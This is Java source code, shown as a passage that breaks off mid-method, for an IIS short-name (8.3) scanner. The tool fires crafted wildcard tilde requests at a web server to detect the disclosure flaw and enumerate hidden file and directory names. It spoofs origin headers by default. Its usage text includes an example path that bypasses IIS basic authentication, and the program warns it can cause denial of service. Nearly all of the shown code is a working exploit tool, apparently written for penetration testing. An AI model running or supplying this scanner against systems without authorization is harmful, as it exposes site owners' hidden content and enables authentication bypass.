package IISShortNameScanner;
import java.io.Console;
import java.lang.reflect.Field;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.text.SimpleDateFormat;
import java.util.*;

import javax.net.ssl.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Enumeration;
import java.util.Properties;

public class IIS_ShortName_Scanner {
	/* Do not change the below lines if it's Greek to you!*/

	private static boolean debugMode;
	private static boolean saveOutput;
	private static String outputFile;
	private static boolean isOutputFileChecked;
	private static boolean hassleFree;
	private static String customUserAgent;
	private static String customCookie;
	private static String additionalQuery;
	private static String scanList;
	private static int maxConnectionTimeOut;
	private static int maxRetryTimes;
	private static String proxyServerName;
	private static Integer proxyServerPort;
	private static Long maxDelayAfterEachRequest;
	private static String questionMarkSymbol;
	private static String asteriskSymbol;
	private static String magicFileName;
	private static String magicFileExtension;
	private static String[] magicFinalPartList;
	private static String[] additionalHeaders;
	private static String[] requestMethod;
	private static int acceptableDifferenceLengthBetweenResponses;
	private static boolean onlyCheckForVulnerableSite = false;
	private static String configFile = "config.xml";
	private final static String strVersion = "2.3.9 (05 February 2017)";
	public Set<String> finalResultsFiles = new TreeSet<String>();
	public Set<String> finalResultsDirs = new TreeSet<String>();
	private static String[] arrayScanList;
	private String[] arrayScanListExt;
	private String[] arrayScanListName;
	private Set<String> scanListName = new TreeSet<String>();
	private Set<String> scanListExtension = new TreeSet<String>();
	private final static String[] marker = {"[-]", "[\\]", "[|]", "[/]"}; // To show the progress
	private static String destURL;
	private static ShowProgressMode currentShowProgressMode;
	private static int concurrentThreads;
	private String magicFinalPart;
	private String reliableRequestMethod;
	private String validStatus = "";
	private List<String> invalidStatus = new ArrayList<String>();;
	private boolean boolIsQuestionMarkReliable = false;
	private boolean boolIsExtensionReliable = false;
	private int threadCounter = 0;
	private ThreadPool threadPool = new ThreadPool(0);
	private long reqCounter = 0;
	private Proxy proxy;
	private int sleepTime = 2; // 2 seconds sleep when we have network error!
	private boolean boolIsNetworkReliable = true;
	private static String nameStartsWith = "";
	private static String extStartsWith = "";
	private static int maxNumericalPart = 10;
	private static int forceNumericalPart = 1;
	private static boolean showActualNames;
	private static boolean isLastFolderIgnored = false;
	private static boolean useProvidedURLWithoutChange;
	
	
	public static void main(String[] args) throws Exception {
		// Get URL from input!
		IIS_ShortName_Scanner obj = new IIS_ShortName_Scanner();

		try {
			if (args.length<=4) {
				Console console = System.console();
				String url = "";
				if (args.length == 0) {
					// To help users to select proper values after execution
					showUsage();
					if(console!=null){
						url = console.readLine("What is the target (e.g. http://localhost:8080/folder/)? ");
						if(!url.equals("") && url.length()>5){
							
							String _hasnewConfigFile = "";
							
							_hasnewConfigFile = console.readLine("Do you want to use a new config file [Y=Yes, Anything Else=No]? ");
							if(_hasnewConfigFile.toLowerCase().equals("y")||_hasnewConfigFile.toLowerCase().equals("yes")){
								String _newConfigFile = console.readLine("New config file?");
								if(!_newConfigFile.equals(""))
									configFile = _newConfigFile;								
							}
							
							String _onlyCheckForVulnerableSiteString = "";
							_onlyCheckForVulnerableSiteString = console.readLine("Do you want to only verify whether or not the target is vulnerable "
									+ "without scanning it thoroughly [Y=Yes, Anything Else=No]? ");
							if(_onlyCheckForVulnerableSiteString.toLowerCase().equals("y")||_onlyCheckForVulnerableSiteString.toLowerCase().equals("yes")){
								onlyCheckForVulnerableSite = true;
								currentShowProgressMode = ShowProgressMode.ALL;
								concurrentThreads = 0;
							}else{
								String _scanMode = "0";
								_scanMode = console.readLine("Scan Mode [0=Show final results only, 1=Show final results step by step, 2=Show Progress (default)]? ");
								switch(_scanMode){
								case "0":
									currentShowProgressMode = ShowProgressMode.FINALRESULT;
									break;
								case "1":
									currentShowProgressMode = ShowProgressMode.PARTIALRESULT;
									break;
								default:
									currentShowProgressMode = ShowProgressMode.ALL;
								}


								String _concurrentThreadsString = "20";
								_concurrentThreadsString = console.readLine("Number of threads [0-50 (20 default)]? ");
								if(!_concurrentThreadsString.equals("") && obj.isInteger(_concurrentThreadsString)){
									int _concurrentThreads = Integer.parseInt(_concurrentThreadsString);
									if(_concurrentThreads>= 0 && _concurrentThreads <= 50){
										concurrentThreads = _concurrentThreads;
									}else
									{
										concurrentThreads = 20;
									}
								}else{
									concurrentThreads = 20;
								}
							}

						}
					}
				}else{
					
					// new custom config file
					if(args.length==2 || args.length==4){
						configFile = args[args.length-1];					
					}
					
					if(args.length==1 || args.length==2){
						// Only check for a vulnerable target
						onlyCheckForVulnerableSite = true;
						url = args[0];
						currentShowProgressMode = ShowProgressMode.FINALRESULT;
						concurrentThreads = 0;
					}else{
						// Full Scan Mode
						if (args[0].equals("0")) {
							currentShowProgressMode = ShowProgressMode.FINALRESULT; // Just show the final results
						} else if (args[0].equals("1")) {
							currentShowProgressMode = ShowProgressMode.PARTIALRESULT; // Just show the findings one by one
						} else {
							currentShowProgressMode = ShowProgressMode.ALL; // Show progress
						}
						concurrentThreads = Integer.parseInt(args[1]);
						if (concurrentThreads < 0) {
							concurrentThreads = 0;
						}

						if (concurrentThreads > 0 && currentShowProgressMode.equals(ShowProgressMode.ALL)) {
							//showProgress = 1; // Show progress may not work beautifully in Multithread mode but I like it!
						}

						url = args[2];
					}
				}
				
				// Load the config file
				loadConfig();
				
				// Basic check for the URL
				if(url.length()<8) throw new Exception("URL is too short!"); // URL is too short
				if(!useProvidedURLWithoutChange){
					if(url.indexOf("?")>0)
						url = url.substring(0, url.indexOf("?"));
					if(url.indexOf(";")>0)
						url = url.substring(0, url.indexOf(";"));
					if(!url.endsWith("/") && url.lastIndexOf("/")<8)
						url += "/"; // add slash after the domain to the root dir
					if(!url.endsWith("/"))
						isLastFolderIgnored = true;
				}
				
				
				destURL = url;
				
				if(!useProvidedURLWithoutChange)
					destURL = destURL.substring(0, destURL.lastIndexOf("/")+1);
				
				if(destURL.length()<8) throw new Exception(); // URL is too short
				
				// show some outputs
				showOutputs("-- Current Configuration -- Begin", ShowProgressMode.PARTIALRESULT);
				showOutputs("Scan Mode: " + currentShowProgressMode.toString(), ShowProgressMode.PARTIALRESULT);
				showOutputs("Number of threads: " + concurrentThreads, ShowProgressMode.PARTIALRESULT);
				showOutputs("Config file: " + configFile, ShowProgressMode.PARTIALRESULT);
				showOutputs("Scanner version: " + strVersion, ShowProgressMode.PARTIALRESULT);

								
				// show some outputs
				showOutputs("-- Current Configuration -- End", ShowProgressMode.PARTIALRESULT);

				arrayScanList = scanList.split("");

				// Delay after each request
				if(maxDelayAfterEachRequest==0 && !hassleFree){
					String delayMilliseconds = "0";
					if(console!=null){
						delayMilliseconds = console.readLine("How much delay do you want after each request in milliseconds [default=0]? ");
						if(!delayMilliseconds.equals("") && obj.isLong(delayMilliseconds)){
							maxDelayAfterEachRequest = Long.parseLong(delayMilliseconds);
							if(maxDelayAfterEachRequest<0){
								maxDelayAfterEachRequest = (long) 0;
							}
						}
					}
				}
				
				showOutputs("Max delay after each request in milliseconds = " + String.valueOf(maxDelayAfterEachRequest), ShowProgressMode.PARTIALRESULT);

				// Proxy server setting
				String hasProxy = "No";
				if((proxyServerName=="" || proxyServerPort ==0)  && !hassleFree){
					if(console!=null){
						hasProxy = console.readLine("Do you want to use proxy [Y=Yes, Anything Else=No]? ");
						if(hasProxy.toLowerCase().equals("y")||hasProxy.toLowerCase().equals("yes")){
							String _proxyServerName = console.readLine("Proxy server Name? ");

							String _proxyServerPort = "0";
							if(!_proxyServerName.equals("")){
								_proxyServerPort = console.readLine("Proxy server port? ");
								if(!_proxyServerPort.equals("") && obj.isInteger(_proxyServerPort)){
									// We can set the proxy server now
									proxyServerName = _proxyServerName;
									proxyServerPort = Integer.parseInt(_proxyServerPort);
									if(proxyServerPort<=0 || proxyServerPort>65535){
										proxyServerName = "";
										proxyServerPort = 0;
									}
								}
							}
						}
					}
				}

				if(!proxyServerName.equals(""))
					showOutputs("\rProxy Server:"+proxyServerName+":"+String.valueOf(proxyServerPort)+"\r\n", ShowProgressMode.PARTIALRESULT);
				else
					showOutputs("\rNo proxy has been used.\r\n", ShowProgressMode.PARTIALRESULT);

				// Beginning...
				Date start_date = new Date();
				
				showOutputs("\rScanning...\r\n", ShowProgressMode.PARTIALRESULT);

				// Start scanning ...
				obj.doScan();
				Date end_date = new Date();
				long l1 = start_date.getTime();
				long l2 = end_date.getTime();
				long difference = l2 - l1;


				// ...Finished
				showOutputs("\r\n\rFinished in: " + difference / 1000 + " second(s)", ShowProgressMode.PARTIALRESULT);
				
				if(console!=null && args.length==0){
					// pause for output
					console.readLine("\r\nPress ENTER to quit...");
				}
			} else {
				showUsage();
			}

		} catch (Exception err) {
			if (debugMode) {
				StringWriter sw = new StringWriter();
				err.printStackTrace(new PrintWriter(sw));
				String exceptionAsString = sw.toString();
				showOutputs(exceptionAsString, OutputType.ERROR);
			}else{
				if(System.console()!=null) showOutputs("An error has occured: " + err.getMessage(), OutputType.ERROR);
				if (args.length != 0) showUsage();
			}
		}
	}

	private static void loadConfig() throws Exception{
		try {
			File file = new File(configFile);
			FileInputStream fileInput = new FileInputStream(file);
			Properties properties = new Properties();

			properties.loadFromXML(fileInput);
			fileInput.close();

			Enumeration<?> enuKeys = properties.keys();			
			String additionalHeadersDelimiter = "";
			String additionalHeadersString = "";
			String magicFinalPartDelimiter = "";
			String magicFinalpartStringList = "";
			String requestMethodDelimiter = "";
			String requestMethodString = "";
			
			String configTextResult = "";
			
			while (enuKeys.hasMoreElements()) {
				String key = (String) enuKeys.nextElement();
				String value = properties.getProperty(key);

				switch(key.toLowerCase()){
				case "debug":
					try{
						debugMode = Boolean.parseBoolean(properties.getProperty(key));
					}catch(Exception e){
						debugMode = false;
					}
					break;
				case "saveoutput":
					try{
						saveOutput = Boolean.parseBoolean(properties.getProperty(key));
					}catch(Exception e){
						saveOutput = false;
					}
					break;
				case "outputfile":
					outputFile =  properties.getProperty(key,"iis_shortname_scanner_logfile.txt");
					isOutputFileChecked = false;
					break;
				case "hasslefree":
					try{
						hassleFree = Boolean.parseBoolean(properties.getProperty(key));
					}catch(Exception e){
						hassleFree = true;
					}
					break;
				case "useragent":
					customUserAgent = properties.getProperty(key,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10");
					break;
				case "cookies":
					customCookie = properties.getProperty(key,"IIS_ShortName_Scanner=1");
					break;
				case "headersdelimiter":
					additionalHeadersDelimiter = properties.getProperty(key,"@@");
					break;
				case "headers":
					additionalHeadersString = properties.getProperty(key,"X-Forwarded-For: 127.0.0.1@@X-Originating-IP: 127.0.0.1@@X-Cluster-Client-Ip: 127.0.0.1");
					break;
				case "urlsuffix":
					additionalQuery = properties.getProperty(key,"?aspxerrorpath=/&aspxerrorpath=/");
					break;
				case "inscopecharacters":
					scanList = properties.getProperty(key,"ETAONRISHDLFCMUGYPWBVKJXQZ0123456789!#$%&'()-@^_`{}~");
					break;
				case "maxconnectiontimeout":
					try{
						maxConnectionTimeOut = Integer.parseInt(properties.getProperty(key,"20000"));
					}catch(Exception e){
						maxConnectionTimeOut = 20000;
					}
					break;
				case "maxretrytimes":
					try{
						maxRetryTimes = Integer.parseInt(properties.getProperty(key,"10"));
					}catch(Exception e){
						maxRetryTimes = 10;
					}
					break;
				case "proxyservername":
					proxyServerName = properties.getProperty(key,"");
					break;
				case "proxyserverport":
					try{
						proxyServerPort = Integer.parseInt(properties.getProperty(key,"0"));
					}catch(Exception e){
						proxyServerPort = 0;
					}
					break;
				case "maxdelayaftereachrequest":			
					try{
						maxDelayAfterEachRequest = Long.parseLong(properties.getProperty(key,"0"));
					}catch(Exception e){
						maxDelayAfterEachRequest = (long) 0;
					}
					break;
				case "magicfinalpartdelimiter":
					magicFinalPartDelimiter = properties.getProperty(key,",");
					break;
				case "magicfinalpartlist":
					magicFinalpartStringList = properties.getProperty(key,"\\a.asp,/a.asp,\\a.aspx,/a.aspx,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,,/a.xxx");
					break;
				case "questionmarksymbol":
					questionMarkSymbol = properties.getProperty(key,"?");
					break;
				case "asterisksymbol":
					asteriskSymbol = properties.getProperty(key,"*");
					break;
				case "magicfilename":
					magicFileName = properties.getProperty(key,"*~1*");
					break;
				case "magicfileextension":
					magicFileExtension = properties.getProperty(key,"*");
					break;
				case "requestmethoddelimiter":
					requestMethodDelimiter = properties.getProperty(key,",");
					break;
				case "requestmethod":
					requestMethodString = properties.getProperty(key,"OPTIONS,GET,POST,HEAD,TRACE,TRACK,DEBUG");
					break;						
				case "acceptabledifferencelengthbetweenresponses":
					try{
						acceptableDifferenceLengthBetweenResponses = Integer.parseInt(properties.getProperty(key,"10"));
					}catch(Exception e){
						acceptableDifferenceLengthBetweenResponses = -1;
					}
					break;
				case "namestartswith":
					nameStartsWith = properties.getProperty(key,"");
					if(nameStartsWith.length()>5){
						nameStartsWith = nameStartsWith.substring(0, 5);
					}
					break;
				case "extstartswith":
					extStartsWith = properties.getProperty(key,"");
					if(extStartsWith.length()>2){
						extStartsWith = extStartsWith.substring(0, 3);
					}
					break;
				case "maxnumericalpart":
					maxNumericalPart = Integer.parseInt(properties.getProperty(key,"10"));
					if(maxNumericalPart<1) maxNumericalPart = 1; // set to minimum
					break;
				case "forcenumericalpart":
					forceNumericalPart = Integer.parseInt(properties.getProperty(key,"1"));
					if(forceNumericalPart<1) forceNumericalPart = 1; // set to minimum
					break;
				case "showactualnames":
					try{
						showActualNames = Boolean.parseBoolean(properties.getProperty(key));
					}catch(Exception e){
						showActualNames = true;
					}
					break;
				case "useprovidedurlwithoutchange":
					try{
						useProvidedURLWithoutChange = Boolean.parseBoolean(properties.getProperty(key));
					}catch(Exception e){
						useProvidedURLWithoutChange = false;
					}
					
					break;
				default:
					showOutputs("Unknown item in config file: " + key);
				}
				if(value=="") value = "Default";
				configTextResult += key + ": " + value + "\r\n";
			}
			showOutputs(configTextResult, ShowProgressMode.PARTIALRESULT);
			additionalHeaders = additionalHeadersString.split(additionalHeadersDelimiter);
			magicFinalPartList = magicFinalpartStringList.split(magicFinalPartDelimiter);
			requestMethod = requestMethodString.split(requestMethodDelimiter);
			if (forceNumericalPart > maxNumericalPart){
				maxNumericalPart = forceNumericalPart;
			}
		} catch (FileNotFoundException e) {
			showOutputs("Error: config file was not found: " + configFile,OutputType.ERROR);
			throw new Exception();
		} catch (IOException e) {
			showOutputs("Error in loading config file: " + configFile,OutputType.ERROR);
			throw new Exception();
		}	
	}

	private static void showUsage() {
		char[] delim = new char[120];
		Arrays.fill(delim, '*');
		showOutputs("");
		showOutputs(String.valueOf(delim));

		showOutputs(" _____ _____ _____   _____ _                _     _   _                        _____                                 \r\n"
				+"|_   _|_   _/  ___| /  ___| |              | |   | \\ | |                      /  ___|                                \r\n"
				+"  | |   | | \\ `--.  \\ `--.| |__   ___  _ __| |_  |  \\| | __ _ _ __ ___   ___  \\ `--.  ___ __ _ _ __  _ __   ___ _ __ \r\n"
				+"  | |   | |  `--. \\  `--. \\ '_ \\ / _ \\| '__| __| | . ` |/ _` | '_ ` _ \\ / _ \\  `--. \\/ __/ _` | '_ \\| '_ \\ / _ \\ '__|\r\n"
				+" _| |_ _| |_/\\__/ / /\\__/ / | | | (_) | |  | |_  | |\\  | (_| | | | | | |  __/ /\\__/ / (_| (_| | | | | | | |  __/ |  \r\n" 
				+" \\___/ \\___/\\____/  \\____/|_| |_|\\___/|_|   \\__| \\_| \\_/\\__,_|_| |_| |_|\\___| \\____/ \\___\\__,_|_| |_|_| |_|\\___|_| \r\n");
		showOutputs("\r\n* IIS Short Name (8.3) Scanner \r\n* by Soroush Dalili - @irsdl");
		showOutputs("* Version: " + strVersion);
		showOutputs("* WARNING: You are only allowed to run the scanner against the websites which you have given permission to scan.\r\n"
				+ 		   "   We do not accept any responsibility for any damage/harm that this application causes to your computer,\r\n"
				+ 		   "   or your network as it is only a proof of concept and may lead to unknown issues.\r\n"
				+		   "   It is your responsibility to use this code legally and you are not allowed to sell this code in any way.\r\n"
				+		   "   The programmer is not responsible for any illegal or malicious use of this code. Be Ethical! \r\n");

		showOutputs(String.valueOf(delim));
		showOutputs("\r\nUSAGE 1 (To verify if the target is vulnerable with the default config file):\r\n java -jar IIS_shortname_scanner.jar [URL]\r\n");
		showOutputs("\r\nUSAGE 2 (To find 8.3 file names with the default config file):\r\n java -jar IIS_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL]\r\n");
		showOutputs("\r\nUSAGE 3 (To verify if the target is vulnerable with a new config file):\r\n java -jar IIS_shortname_scanner.jar [URL] [configFile]\r\n");
		showOutputs("\r\nUSAGE 4 (To find 8.3 file names with a new config file):\r\n java -jar IIS_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL] [configFile]\r\n");
		showOutputs("DETAILS:");
		showOutputs(" [ShowProgress]: 0= Show final results only - 1= Show final results step by step  - 2= Show Progress");
		showOutputs(" [ThreadNumbers]: 0= No thread - Integer Number = Number of concurrent threads [be careful about IIS Denial of Service]");
		showOutputs(" [URL]: A complete URL - starts with http/https protocol");
		showOutputs(" [configFile]: path to a new config file which is based on config.xml\r\n\r\n");
		showOutputs("- Example 0 (to see if the target is vulnerable):\r\n java -jar IIS_shortname_scanner.jar http://example.com/folder/\r\n");
		showOutputs("- Example 1 (uses no thread - very slow):\r\n java -jar IIS_shortname_scanner.jar 2 0 http://example.com/folder/new%20folder/\r\n");
		showOutputs("- Example 2 (uses 20 threads - recommended):\r\n java -jar IIS_shortname_scanner.jar 2 20 http://example.com/folder/new%20folder/\r\n");
		showOutputs("- Example 3 (saves output in a text file):\r\n java -jar IIS_shortname_scanner.jar 0 20 http://example.com/folder/new%20folder/ > c:\\results.txt\r\n");
		showOutputs("- Example 4 (bypasses IIS basic authentication):\r\n java -jar IIS_shortname_scanner.jar 2 20 http://example.com/folder/AuthNeeded:$I30:$Index_Allocation/\r\n");
		showOutputs("- Example 5 (using a new config file):\r\n java -jar IIS_shortname_scanner.jar 2 20 http://example.com/folder/ newconfig.xml \r\n");
		showOutputs("Note 1: Edit config.xml file to change the scanner settings, for instance to add additional headers.");
		showOutputs("Note 2: Sometimes it does not work for the first time and you need to try again.");
		showOutputs(String.valueOf(delim));
	}

	private void doScan() throws Exception {
		magicFileName = magicFileName.replace("*", asteriskSymbol);
		magicFileExtension = magicFileExtension.replace("*", asteriskSymbol);

		boolean isReliableResult = false;
		// Create the proxy string
		if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
			proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyServerName, proxyServerPort));
		}

		for(String s1:magicFinalPartList){
			for(String s2:requestMethod){
				magicFinalPart = s1;
				reliableRequestMethod = s2;
				showOutputs("Testing request method: \"" + s2 + "\" with magic part: \""+ s1 + "\" ...", ShowProgressMode.PARTIALRESULT);
				
				 
				isReliableResult = isReliable();
				if (isReliableResult) {
					if(onlyCheckForVulnerableSite){
						break;
					}else{
						boolIsQuestionMarkReliable = isQuestionMarkReliable();
						if (concurrentThreads == 0) {
							iterateScanFileName("");
						} else {
							scanListPurifier();
							threadPool = new ThreadPool(concurrentThreads);
							incThreadCounter(1);
							threadPool.runTask(multithread_iterateScanFileName(""));
						}
					}
					break;
				}
			}
			if (isReliableResult) break;
		}

		while (threadCounter != 0) {
			Thread.sleep(1);
		}
		threadPool.join();
		if(!currentShowProgressMode.equals(ShowProgressMode.FINALRESULT))
			showOutputs("");
		showOutputs("# IIS Short Name (8.3) Scanner version " + strVersion + " - scan initiated " + (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date()));
		showOutputs("Target: " + destURL);
		if(!isReliableResult)
			showOutputsTree("Result: Not vulnerable or no item was found. It was not possible to get proper/different error messages from the server. Check the inputs and try again.", 0);
		else{
			showOutputsTree("Result: Vulnerable!", 0);
			showOutputsTree("Used HTTP method: " + reliableRequestMethod, 0);
			showOutputsTree("Suffix (magic part): "+ magicFinalPart, 0);
		}
		
		// Warnings
		List<String> warningStrings = new ArrayList<String>();
		if(isLastFolderIgnored)
			warningStrings.add("URL does not end with a slash character (/) - last folder was ignored!");
		if(!destURL.toLowerCase().startsWith("http://") && !destURL.toLowerCase().startsWith("https://"))
			warningStrings.add("URL does not start with HTTP:// or HTTPS:// protocol - this may fail the scanner completely!");
		// Only shows more warnings when we are trying to get files/folders as well
		if(!onlyCheckForVulnerableSite){
			// Show message for boolIsQuestionMarkReliable
			if(!boolIsQuestionMarkReliable){
				warningStrings.add("Question mark character was blocked: you may have a lot of false positives. -> manual check is needed.");
			}
			// Show message for boolIsExtensionReliable
			if(!boolIsExtensionReliable){
				warningStrings.add("File extensions could not be verified. you may have false positive results. -> manual check is needed.");
			}
			
			// Show message when there was network error
			if(!boolIsNetworkReliable){
				warningStrings.add("Some network problems were detected and the results can be unreliable. Please try again with less threads.");
			}
		}
		if (warningStrings.size()>0){
			
			showOutputsTree("Warning(s):",0); 
			for(String strWarning:warningStrings){
				showOutputsTree(strWarning,1);
			}
		}
		
		
		//showOutputs("\r\n\r\n--------- Final Result ---------");
		showOutputsTree("Extra information:",0);
		
		//showOutputs(getReqCounter() + " requests have been sent to the server:");
		showOutputsTree("Number of sent requests: " + getReqCounter(),1);
		if (!finalResultsDirs.isEmpty() || !finalResultsFiles.isEmpty()) {
			
			showOutputsTree("Identified directories: " + finalResultsDirs.size(),1);
			for (String s : finalResultsDirs) {
				String currentName = s;
				showOutputsTree(s,2);
				String currentExt = "";
				if(s.length() - s.lastIndexOf(".") <= 3){
					currentName = s.substring(0, s.lastIndexOf("."));
					currentExt = s.substring(s.lastIndexOf("."));
				}
				if(showActualNames){
					if  (currentName.lastIndexOf("~") < 6){
						if  (currentName.lastIndexOf("~") == 5 && s.matches(".*(\\w\\d|\\d\\w).*")){
							showOutputsTree("Possible directory name = " + s.substring(0,currentName.lastIndexOf("~")), 3);
						}else{
							showOutputsTree("Actual directory name = " + s.substring(0,currentName.lastIndexOf("~")),3);
						}
					}
					if  (s.length() - s.lastIndexOf(".") <= 3)
						showOutputsTree("Actual extension = " + currentExt,3);
				}
				

			}
			
			showOutputsTree("Identified files: " + finalResultsFiles.size(), 1);
			for (String s : finalResultsFiles) {
				String currentName = s;
				showOutputsTree(s, 2);
				String currentExt = "";
				if(s.length() - s.lastIndexOf(".") <= 3){
					currentName = s.substring(0, s.lastIndexOf("."));
					currentExt = s.substring(s.lastIndexOf("."));
				}
				if(showActualNames){
					if  (currentName.lastIndexOf("~") < 6){	
						if  (currentName.lastIndexOf("~") == 5 && s.matches("^[a-fA-F0-9]{5}.*")){
							showOutputsTree("Possible file name = " + s.substring(0,currentName.lastIndexOf("~")),3);
						}else{
							showOutputsTree("Actual file name = " + s.substring(0,currentName.lastIndexOf("~")),3);
						}
					}
					if  (s.length() - s.lastIndexOf(".") <= 3)
						showOutputsTree("Actual extension = " + currentExt, 3);
				}
				
			}
		}

		//showOutputs(finalResultsDirs.size() + " Dir(s) was/were found");
		//showOutputs(finalResultsFiles.size() + " File(s) was/were found\r\n");
	
	}

	private void scanListPurifier() {
		try {
			ThreadPool localThreadPool = new ThreadPool(concurrentThreads);
			for (int i = 0; i < arrayScanList.length; i++) {
				
				if(nameStartsWith.length()<6)
					localThreadPool.runTask(multithread_NameCharPurifier(arrayScanList[i]));
				
				if(boolIsExtensionReliable && extStartsWith.length() < 3){
					localThreadPool.runTask(multithread_ExtensionCharPurifier(arrayScanList[i]));
				}
			}
			localThreadPool.join();
			arrayScanListName=(String[])scanListName.toArray(new String[0]);
			if(boolIsExtensionReliable)
				arrayScanListExt=(String[])scanListExtension.toArray(new String[0]);
		} catch (Exception err) {
			if (debugMode) {
				StringWriter sw = new StringWriter();
				err.printStackTrace(new PrintWriter(sw));
				String exceptionAsString = sw.toString();
				showOutputs(exceptionAsString, OutputType.ERROR);
			}
		}
	}

	private Runnable multithread_NameCharPurifier(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String statusCode = GetStatus("/" + nameStartsWith + asteriskSymbol + strInput + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart); // Should be valid to be added to the list
					
					showOutputs("Is this character valid in name? " + strInput, OutputType.DEBUG);
					
					// when extension should start with something
					if(!extStartsWith.equals(""))
						statusCode = GetStatus("/" + nameStartsWith + asteriskSymbol + strInput + asteriskSymbol + "~1" + asteriskSymbol + "." + extStartsWith + magicFileExtension + magicFinalPart);
					
					if (statusCode.equals("valid")) {
						String tempInvalidStatusCode = GetStatus("/" + nameStartsWith + asteriskSymbol + new String(new char[7]).replace("\0", strInput) + asteriskSymbol + "~1" + asteriskSymbol + "." + extStartsWith + magicFileExtension + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
						// So if tempInvalidStatusCode is also equal to 404 then something is very wrong!
						if (!tempInvalidStatusCode.equals("valid")) {	
							statusCode = GetStatus("/1234567890" + strInput + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters! 
							
							// when extension should start with something
							if(!magicFileExtension.equals(""))
								statusCode = GetStatus("/1234567890" + strInput + asteriskSymbol + "~1" + asteriskSymbol + "." + extStartsWith + magicFileExtension + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters! 
							
							if (!statusCode.equals("valid")) {
								addValidCharToName(strInput); // Valid character - add it to the list

								showOutputs("Valid character in name:" + strInput, OutputType.DEBUG);

							}
						}
					}
				} catch (Exception err) {
					if (debugMode) {
						StringWriter sw = new StringWriter();
						err.printStackTrace(new PrintWriter(sw));
						String exceptionAsString = sw.toString();
						showOutputs(exceptionAsString, OutputType.ERROR);
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private synchronized void addValidCharToName(String strInput) {
		scanListName.add(strInput);
	}

	private Runnable multithread_ExtensionCharPurifier(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String statusCode = GetStatus("/" + nameStartsWith + asteriskSymbol + "~1." + extStartsWith + asteriskSymbol + strInput + asteriskSymbol + magicFinalPart); // Should be valid to be added to the list

					showOutputs("Is this character valid in extension? " + strInput, OutputType.DEBUG);
					
					if (statusCode.equals("valid")) {
						String tempInvalidStatusCode = GetStatus("/" + nameStartsWith + asteriskSymbol + "~1." + extStartsWith + asteriskSymbol + new String(new char[4]).replace("\0", strInput) + asteriskSymbol + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
						// So if tempInvalidStatusCode is also equal to 404 then something is very wrong!
						if (!tempInvalidStatusCode.equals("valid")) {
							statusCode = GetStatus("/" + nameStartsWith + asteriskSymbol + "~1." + asteriskSymbol + strInput + "1234567890" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
							if (!statusCode.equals("valid")) {
								addValidCharToExtension(strInput); // Valid character - add it to the list

								showOutputs("Valid character in extension:" + strInput, OutputType.DEBUG);

							}
						}
					}
				} catch (Exception err) {
					if (debugMode) {
						StringWriter sw = new StringWriter();
						err.printStackTrace(new PrintWriter(sw));
						String exceptionAsString = sw.toString();
						showOutputs(exceptionAsString, OutputType.ERROR);
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private synchronized void addValidCharToExtension(String strInput) {
		scanListExtension.add(strInput);
	}

	private Runnable multithread_iterateScanFileName(final String strInputFinal) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String strInput = strInputFinal;
					if(strInput.equals("") && !nameStartsWith.equals("")){
						strInput = nameStartsWith;
					}
					boolean atLeastOneSuccess = false;
					for (int i = 0; i < arrayScanListName.length; i++) {
						String newStr = strInput + arrayScanListName[i];
						
						String statusCode = "";
						if(!extStartsWith.equals(""))
							statusCode = GetStatus("/" + newStr + magicFileName + "." + extStartsWith + magicFileExtension + magicFinalPart);
						else
							statusCode = GetStatus("/" + newStr + magicFileName + magicFinalPart);
							
						if (currentShowProgressMode.equals(ShowProgressMode.ALL)) {
							String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanListName[i].toUpperCase() + "\t\t";
							System.out.print(internalMessage); // To show the progress! - Just Pretty! - we don't need to log this so we need to print it here without using showOutputs
						}
						
						if (statusCode.equals("valid")) {
							atLeastOneSuccess = true;
							//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
							int isItLastFileName = isItLastFileName(newStr);
							if (isItLastFileName > 0) {
								// Add it to final list
								int counter = 1;
								while ((statusCode.equals("valid") && counter <= maxNumericalPart) || (counter <= forceNumericalPart && counter > 1)) {
									String fileName = newStr + "~" + counter;
									// Find Extension
									if (isItFolder(fileName) == 1) {
											
										showOutputs("\rDir: " + fileName.toUpperCase() + "\t\t", ShowProgressMode.PARTIALRESULT);

										addValidDirToResults(fileName.toUpperCase());
									}
									if(boolIsExtensionReliable){
										fileName += ".";
										if(extStartsWith.length()==3){
											// we have already found our file as the extension was in the config file
											addValidFileToResults(fileName.toUpperCase()+extStartsWith);
										}else{
											incThreadCounter(1);
											threadPool.runTask(multithread_iterateScanFileExtension(fileName, ""));
										}
										statusCode = GetStatus("/" + newStr + magicFileName.replace("1", Integer.toString(++counter)) + magicFinalPart);
									}else{
										showOutputs("\rFile: " + fileName.toUpperCase() + ".??? - extension cannot be found\t\t", ShowProgressMode.PARTIALRESULT);
										addValidFileToResults(fileName.toUpperCase()+".???");
										statusCode = "000 Extension is not reliable";
									}
								}
								if (isItLastFileName == 2) {
									incThreadCounter(1);
									threadPool.runTask(multithread_iterateScanFileName(newStr));
								}
							} else {
								incThreadCounter(1);
								threadPool.runTask(multithread_iterateScanFileName(newStr));
							}
						} else {
							// Ignore it?
